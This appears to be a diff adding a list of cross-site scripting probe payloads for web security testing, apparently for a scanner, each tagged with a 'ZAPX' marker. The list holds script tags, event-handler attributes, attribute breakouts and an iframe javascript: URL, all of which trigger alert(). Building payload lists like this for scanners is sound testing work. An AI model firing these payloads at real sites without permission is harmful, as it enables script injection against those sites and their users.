@@ -1,0 +1,17 @@
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(1)>
+<img src=x onerror=alert(/ZAPX/)>
+"><img src=x onerror=alert(document.domain)>
+<script>alert('ZAPX1')</script>
+<script>alert(String.fromCharCode(90,65,80,88,50))</script>
+"><img src=x onerror=alert('ZAPX3')>
+<img src=x onerror=alert('ZAPX4')>
+<svg onload=alert('ZAPX5')>
+"><svg/onload=alert('ZAPX6')>
+" onmouseover=alert('ZAPX7') x="
+'><script>alert('ZAPX8')</script>
+<body onload=alert('ZAPX9')>
+<iframe src="javascript:alert('ZAPX10')"></iframe>
+<ScRiPt>alert('ZAPX11')</ScRiPt>
+<img src=x onerror=alert('ZAPX12') >
+ZAPX13_benign_marker
